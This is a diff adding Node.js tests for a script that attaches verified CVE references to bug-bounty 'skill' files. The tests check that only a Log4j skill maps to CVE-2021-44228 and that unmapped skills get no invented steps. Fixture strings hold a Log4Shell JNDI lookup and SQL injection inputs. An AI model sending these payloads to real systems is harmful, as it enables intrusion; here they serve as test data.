@@ -1,6 +1,6 @@
 import test from "node:test";
 import assert from "node:assert/strict";
-import { mkdtemp, readFile, rm } from "node:fs/promises";
+import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -11,6 +11,10 @@ import {
   TIER_A_SKILLS,
   CHECKLIST_SKILLS,
   KEEP_SKILLS,
+  TIER_B_SKILLS,
+  TIER_C_SKILLS,
+  NO_CVE_MAPPED,
+  NO_CVE_TARGET,
   BODY_START,
   nvdWaitMs,
   expandCitedIds,
@@ -31,6 +35,12 @@ import {
   createRunContext,
   enrichCve,
   cacheDocument,
+  confidentCveForSkill,
+  nvdConfirmsCandidate,
+  markUnverified,
+  applyTierB,
+  applyTierC,
+  backfillBc,
 } from "../scripts/enrich-repro.mjs";
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
@@ -490,5 +500,237 @@ test("smoke: each tier-a skill has repro and a cited Steps section; checklists a
     assert.equal(text.includes(BODY_START), false, rel);
     assert.equal(text.includes("kind: checklist"), false, rel);
     assert.equal(/^repro:/m.test(text), false, rel);
+  }
+});
+
+test("tier B and C lists do not overlap protected skills", () => {
+  const protectedSkills = new Set([...TIER_A_SKILLS, ...CHECKLIST_SKILLS, ...KEEP_SKILLS]);
+  assert.equal(TIER_B_SKILLS.length, 81);
+  assert.equal(new Set(TIER_B_SKILLS).size, 81);
+  assert.equal(TIER_C_SKILLS.length, 90);
+  assert.equal(new Set(TIER_C_SKILLS).size, 90);
+  for (const rel of [...TIER_B_SKILLS, ...TIER_C_SKILLS]) assert.equal(protectedSkills.has(rel), false, rel);
+  for (const rel of TIER_B_SKILLS) assert.equal(TIER_C_SKILLS.includes(rel), false, rel);
+});
+
+test("only the Log4j 2.14.1 JNDI skill resolves a CVE", () => {
+  const log4 = "# SKILL: log4shell\nJava + Log4j ≤ 2.14.1.\n${jndi:ldap://collab/a}\n";
+  assert.equal(confidentCveForSkill("skills/seeds/log4shell.md", log4), "CVE-2021-44228");
+  assert.equal(confidentCveForSkill("skills/seeds/log4shell.md", "# SKILL: log4shell\nLog4j somewhere\n"), null);
+  assert.equal(confidentCveForSkill("skills/seeds/sqli.md", "# SKILL: sqli\nLog4j ≤ 2.14.1 ${jndi:ldap://x}\n"), null);
+  assert.equal(confidentCveForSkill("skills/staging/0x002132-skills-bugbounty-okta-attack.staged.md", "Okta .okta.com password spray"), null);
+  assert.equal(nvdConfirmsCandidate({
+    id: "CVE-2021-44228",
+    nvd: { status: 200, description: "Apache Log4j2 through 2.15.0 JNDI features" },
+  }, "CVE-2021-44228"), true);
+  assert.equal(nvdConfirmsCandidate({
+    id: "CVE-2021-44228",
+    nvd: { status: 200, description: "A different product is affected by improper input validation." },
+  }, "CVE-2021-44228"), false);
+  assert.equal(nvdConfirmsCandidate({
+    id: "CVE-2021-44228",
+    nvd: { status: 403, rateLimited: true, description: "Apache Log4j2 JNDI" },
+  }, "CVE-2021-44228"), false);
+});
+
+test("no confident match and tier C are unverified status blocks with no invented steps", () => {
+  const original = "# SKILL: sqli\n' OR '1'='1\n1 UNION SELECT NULL--\n";
+  const once = markUnverified(original, NO_CVE_MAPPED);
+  const twice = markUnverified(once, NO_CVE_MAPPED);
+  assert.equal(twice, once);
+  assert.match(once, /^cve: null$/m);
+  assert.match(once, /^repro: unverified$/m);
+  assert.match(once, /^- no CVE mapped$/m);
+  assert.equal(once.includes("### Prerequisites"), false);
+  assert.equal(once.includes("### Input / trigger"), false);
+  const block = once.slice(once.indexOf(BODY_START), once.indexOf("<!-- bughive-repro-end -->"));
+  assertNoInventedPayload(block, "");
+  assert.match(once, /UNION SELECT/);
+
+  const tierC = applyTierC("# SKILL: bughunter\nHunt for real bugs.\n");
+  const tierCAgain = applyTierC(tierC);
+  assert.equal(tierCAgain, tierC);
+  assert.match(tierC, /^repro: unverified$/m);
+  assert.match(tierC, /^- no CVE\/target in skill; needs teardown or stays unverified$/m);
+  assert.equal(tierC.includes(NO_CVE_MAPPED), false);
+  const tierBlock = tierC.slice(tierC.indexOf(BODY_START), tierC.indexOf("<!-- bughive-repro-end -->"));
+  assertNoInventedPayload(tierBlock, "");
+  assert.equal(tierBlock.includes("curl"), false);
+});
+
+test("offline backfill enriches a confident CVE, marks the rest, and writes one cache file", async () => {
+  const nvdVerified = await load("nvd-verified.json");
+  const ghsa = await load("ghsa-verified.json");
+  const poc = await load("poc-verified.json");
+  const vendor = await load("vendor-verified.html");
+  const kev = indexKev(JSON.parse(await load("kev-mini.json")));
+  const exploitdb = indexExploitdb(await load("exploitdb-mini.csv"));
+  const calls = [];
+  const fetchImpl = async (url) => {
+    calls.push(url);
+    if (url.includes("/-/raw/main/exploits/")) throw new Error(`exploit body fetched: ${url}`);
+    if (url.includes("services.nvd.nist.gov") && url.includes("CVE-2021-44228")) return response(200, nvdVerified);
+    if (url.includes("api.github.com/advisories") && url.includes("CVE-2021-44228")) return response(200, ghsa);
+    if (url.includes("logging.apache.org")) return response(200, vendor);
+    if (url.includes("PoC-in-GitHub") && url.includes("CVE-2021-44228")) return response(200, poc);
+    throw new Error(`unexpected url ${url}`);
+  };
+  const root = await mkdtemp(join(tmpdir(), "bh-bc-"));
+  try {
+    await mkdir(join(root, "skills/seeds"), { recursive: true });
+    const log4 = "# SKILL: log4shell\nJava + Log4j ≤ 2.14.1.\n${jndi:ldap://collab/a}\n";
+    const sqli = "# SKILL: sqli\n' OR '1'='1\n";
+    const note = "# SKILL: bughunter\nNo target.\n";
+    await writeFile(join(root, "skills/seeds/log4shell.md"), log4);
+    await writeFile(join(root, "skills/seeds/sqli.md"), sqli);
+    await writeFile(join(root, "skills/seeds/note.md"), note);
+    const cacheDir = join(root, "cache");
+    const ctx = createRunContext({
+      fetch: fetchImpl,
+      sleep: async () => {},
+      nvdIntervalMs: 0,
+      cacheDir,
+      kev,
+      exploitdb,
+      h1ByCve: new Map(),
+      now: () => new Date("2026-11-04T00:00:00.000Z"),
+      token: "",
+    });
+    const summary = await backfillBc(ctx, {
+      root,
+      tierB: ["skills/seeds/log4shell.md", "skills/seeds/sqli.md"],
+      tierC: ["skills/seeds/note.md"],
+      write: true,
+    });
+    assert.equal(summary.confident_cve, 1);
+    assert.equal(summary.unmapped, 1);
+    assert.equal(summary.tier_c_unverified, 1);
+    assert.deepEqual(summary.cache_added, ["CVE-2021-44228"]);
+    assert.equal(calls.some((url) => url.includes("CVE-2024")), false);
+    assert.equal(calls.some((url) => url.includes("/-/raw/main/exploits/")), false);
+    const names = await readdir(cacheDir);
+    assert.deepEqual(names, ["CVE-2021-44228.json"]);
+    const enriched = await readFile(join(root, "skills/seeds/log4shell.md"), "utf8");
+    assert.match(enriched, /^cve: CVE-2021-44228$/m);
+    assert.match(enriched, /^repro: verified-public$/m);
+    assert.match(enriched, /^references:$/m);
+    assert.match(enriched, /## Steps to reproduce/);
+    assert.equal(enriched.includes(NO_CVE_MAPPED), false);
+    const steps = enriched.slice(enriched.indexOf(BODY_START), enriched.indexOf("<!-- bughive-repro-end -->"));
+    assertCited(steps);
+    const doc = JSON.parse(await readFile(join(cacheDir, "CVE-2021-44228.json"), "utf8"));
+    let corpus = "";
+    for (const excerpt of doc.audit?.excerpts || []) corpus += `\n${excerpt.text || ""}`;
+    corpus += `\n${doc.record?.nvd?.description || ""}`;
+    corpus += `\n${doc.record?.ghsa?.description || ""}`;
+    corpus += `\n${doc.record?.vendor?.excerpt || ""}`;
+    assertNoInventedPayload(steps, corpus);
+    assert.equal(JSON.stringify(doc).includes("import "), false);
+    const unmapped = await readFile(join(root, "skills/seeds/sqli.md"), "utf8");
+    assert.match(unmapped, /^- no CVE mapped$/m);
+    assert.match(unmapped, /^repro: unverified$/m);
+    const tierC = await readFile(join(root, "skills/seeds/note.md"), "utf8");
+    assert.match(tierC, /^- no CVE\/target in skill; needs teardown or stays unverified$/m);
+    ctx.fetch = async () => { throw new Error("network should not be used"); };
+    const again = await backfillBc(ctx, {
+      root,
+      tierB: ["skills/seeds/log4shell.md", "skills/seeds/sqli.md"],
+      tierC: ["skills/seeds/note.md"],
+      write: true,
+    });
+    assert.equal(again.cache_added_count, 0);
+    assert.equal(await readFile(join(root, "skills/seeds/log4shell.md"), "utf8"), enriched);
+    assert.equal(await readFile(join(root, "skills/seeds/sqli.md"), "utf8"), unmapped);
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
+test("a confident id whose NVD text is a different product is refused and not cached", async () => {
+  const root = await mkdtemp(join(tmpdir(), "bh-bc-miss-"));
+  try {
+    const cacheDir = join(root, "cache");
+    const ctx = createRunContext({
+      fetch: async (url) => {
+        if (url.includes("services.nvd.nist.gov")) {
+          return response(200, JSON.stringify({
+            totalResults: 1,
+            vulnerabilities: [{ cve: { id: "CVE-2021-44228", vulnStatus: "Analyzed", descriptions: [{ lang: "en", value: "ExampleApp before 1.2.3 is affected by improper input validation." }], references: [] } }],
+          }));
+        }
+        if (url.includes("api.github.com/advisories")) return response(200, "[]");
+        if (url.includes("PoC-in-GitHub")) return response(404, "missing");
+        throw new Error(`unexpected url ${url}`);
+      },
+      sleep: async () => {},
+      nvdIntervalMs: 0,
+      cacheDir,
+      kev: new Map(),
+      exploitdb: new Map(),
+      h1ByCve: new Map(),
+      token: "",
+    });
+    await assert.rejects(
+      () => applyTierB("skills/seeds/log4shell.md", "# SKILL: log4shell\nJava + Log4j ≤ 2.14.1.\n${jndi:ldap://x}\n", ctx),
+      /did not confirm/,
+    );
+    let names = [];
+    try { names = await readdir(cacheDir); } catch { names = []; }
+    assert.deepEqual(names, []);
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
+test("committed tier B and tier C skills match the backfill", async () => {
+  let enriched = 0;
+  let unmapped = 0;
+  for (const rel of TIER_B_SKILLS) {
+    const text = await readFile(join(ROOT, rel), "utf8");
+    const start = text.indexOf(BODY_START);
+    const end = text.indexOf("<!-- bughive-repro-end -->");
+    assert.ok(start >= 0 && end > start, rel);
+    const block = text.slice(start, end);
+    if (rel.endsWith("/log4shell.md")) {
+      enriched += 1;
+      assert.equal(confidentCveForSkill(rel, text), "CVE-2021-44228");
+      assert.match(text, /^cve: CVE-2021-44228$/m, rel);
+      assert.match(text, /^repro:\s*(verified-public|partial|unverified)\s*$/m, rel);
+      assert.match(text, /^references:$/m, rel);
+      assert.equal(block.includes(NO_CVE_MAPPED), false, rel);
+      assertCited(block);
+      const doc = JSON.parse(await readFile(join(ROOT, "skills/_index/repro/CVE-2021-44228.json"), "utf8"));
+      let corpus = "";
+      for (const excerpt of doc.audit?.excerpts || []) corpus += `\n${excerpt.text || ""}`;
+      corpus += `\n${doc.record?.vendor?.excerpt || ""}`;
+      corpus += `\n${doc.record?.nvd?.description || ""}`;
+      corpus += `\n${doc.record?.ghsa?.description || ""}`;
+      assertNoInventedPayload(block, corpus);
+      assert.equal(JSON.stringify(doc.sources?.exploitdb || []).includes("import "), false);
+    } else {
+      unmapped += 1;
+      assert.equal(confidentCveForSkill(rel, text), null, rel);
+      assert.match(text, /^cve: null$/m, rel);
+      assert.match(text, /^repro: unverified$/m, rel);
+      assert.match(block, /^- no CVE mapped$/m, rel);
+      assert.equal(block.includes("### Prerequisites"), false, rel);
+      assert.equal(block.includes("### Input / trigger"), false, rel);
+      assertNoInventedPayload(block, "");
+    }
+  }
+  assert.equal(enriched, 1);
+  assert.equal(unmapped, 80);
+  for (const rel of TIER_C_SKILLS) {
+    const text = await readFile(join(ROOT, rel), "utf8");
+    const start = text.indexOf(BODY_START);
+    const end = text.indexOf("<!-- bughive-repro-end -->");
+    assert.ok(start >= 0 && end > start, rel);
+    const block = text.slice(start, end);
+    assert.match(text, /^cve: null$/m, rel);
+    assert.match(text, /^repro: unverified$/m, rel);
+    assert.match(block, /^- no CVE\/target in skill; needs teardown or stays unverified$/m, rel);
+    assert.equal(block.includes(NO_CVE_MAPPED), false, rel);
+    assert.equal(block.includes("### Prerequisites"), false, rel);
+    assertNoInventedPayload(block, "");
   }
 });
